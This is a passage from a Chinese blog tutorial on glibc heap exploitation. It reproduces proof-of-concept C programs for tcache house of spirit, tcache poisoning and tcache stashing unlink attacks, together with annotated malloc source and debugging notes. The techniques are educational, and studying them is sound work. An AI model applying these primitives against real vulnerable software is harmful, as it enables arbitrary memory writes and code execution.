class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    <span class="built_in">assert</span>(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-20"><a href="#调试-20" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110448627.png"
                      alt="image-20231015110448627"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110515624.png"
                      alt="image-20231015110515624"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110726890.png"
                      alt="image-20231015110726890"
                ></p>
<p>首先申请<code>9</code>个 <code>non-fast_chunk</code> 和一个 <code>obstruct-chunk</code> ，将 <code>tcache</code>  填满，剩余两个放入 <code>unsorted_bin</code>，因为 <code>a</code> 与 <code>prev</code>相邻，所以会被整合在一起。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110930692.png"
                      alt="image-20231015110930692"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110909769.png"
                      alt="image-20231015110909769"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111410250.png"
                      alt="image-20231015111410250"
                ></p>
<p>从 <code>tcache</code> 头部取出一个 <code>chunk</code> ，然后再次 <code>free(a)</code>，此时 <code>chunk_a</code> 同时出现在了 <code>unsorted_bin</code> 和 <code>tcache</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111505547.png"
                      alt="image-20231015111505547"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111750815.png"
                      alt="image-20231015111750815"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111900959.png"
                      alt="image-20231015111900959"
                ></p>
<p>此时申请 <code>0x120</code> 大小的 <code>chunk</code> 将 <code>unsorted_bin</code> 中包含 <code>chunk_a_fd</code> 的 <code>chunk</code> 申请出来，我们就可以修改 <code>tcache</code> 中 <code>chunk_a</code> 的下一个链接进来的 <code>chunk</code> 为我们伪造的 <code>chunk</code>，在申请两次用户区为 <code>0x100</code> 大小的 <code>chunk</code> 就可以将我们伪造的 <code>chunk</code> 申请出来。</p>
<h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="源码-21"><a href="#源码-21" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调试-21"><a href="#调试-21" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015121919702.png"
                      alt="image-20231015121919702"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015121949906.png"
                      alt="image-20231015121949906"
                ></p>
<p>这种利用能够方法很简单，只需要将 <code>fake_chunks_size=0x40</code>，然后 <code>free(fake_chunk)</code> 即可将其放入到 <code>tcache</code> 中，再去申请 <code>0x30</code> 大小的 <code>chunk</code> 即可将其申请出来。</p>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="源码-22"><a href="#源码-22" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-22"><a href="#调试-22" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015125946150.png"
                      alt="image-20231015125946150"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130236228.png"
                      alt="image-20231015130236228"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130341804.png"
                      alt="image-20231015130341804"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130255142.png"
                      alt="image-20231015130255142"
                ></p>
<p>申请同样大小的 <code>a,b</code> 两个 <code>chunk</code>，并将其放在 <code>tcache</code> 中。然后将后进入的 <code>chunk_b_fd</code> 改为 <code>stack_var_fd</code>，这样就能将其链接进 <code>tcache</code>，<code>tcache</code> 的数量为 <code>2</code>，可以申请两个 <code>chunk</code> 出来。 在 <code>2.29</code> 以后，如果 <code>tcache</code> 的数量为 <code>0</code>，就算 <code>tcache</code> 中有 <code>free_chunk</code> 也不会将其取出来，所以我们确保 <code>tcache</code> 的数量为 <code>2</code>，这样就能取出两个 <code>chunk</code>。</p>
<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2><p>利用 <code>calloc</code> 可以越过 <code>tcache</code> 取 <code>chunk</code> 的特点结合 <code>house of lore</code> 进行的攻击手段，可以向任意地址写入任意值，也可以申请任意地址。</p>
<h3 id="源码-23"><a href="#源码-23" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE <span class="comment">//如果程序启用了Tcache</span></span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">        stash them in the tcache.  */</span></span><br><span class="line">        <span class="comment">//遍历整个smallbin，获取相同size的free chunk</span></span><br><span class="line">        <span class="type">size_t</span> tc_idx = <span class="built_in">csize2tidx</span> (nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="comment">//判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。</span></span><br><span class="line">            <span class="comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span class="line">            <span class="keyword">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                   &amp;&amp; (tc_victim = <span class="built_in">last</span> (bin) ) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//如果成功获取了Chunk</span></span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    <span class="comment">//设置标志位</span></span><br><span class="line">                    <span class="built_in">set_inuse_bit_at_offset</span> (tc_victim, nb);</span><br><span class="line">                    <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        <span class="built_in">set_non_main_arena</span> (tc_victim);</span><br><span class="line">                    <span class="comment">//取出最后一个Chunk</span></span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line">                    <span class="comment">//将其放入到Tcache中</span></span><br><span class="line">                    <span class="built_in">tcache_put</span> (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>可以看到，这种攻击手段并没有经过 <code>house of lore</code> 的需要经过的验证，即没有这一个要求 <code> bck-&gt;fd == victim</code>。</p>
<h3 id="调试-23"><a href="#调试-23" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015135526620.png"
                      alt="image-20231015135526620"
                ></p>
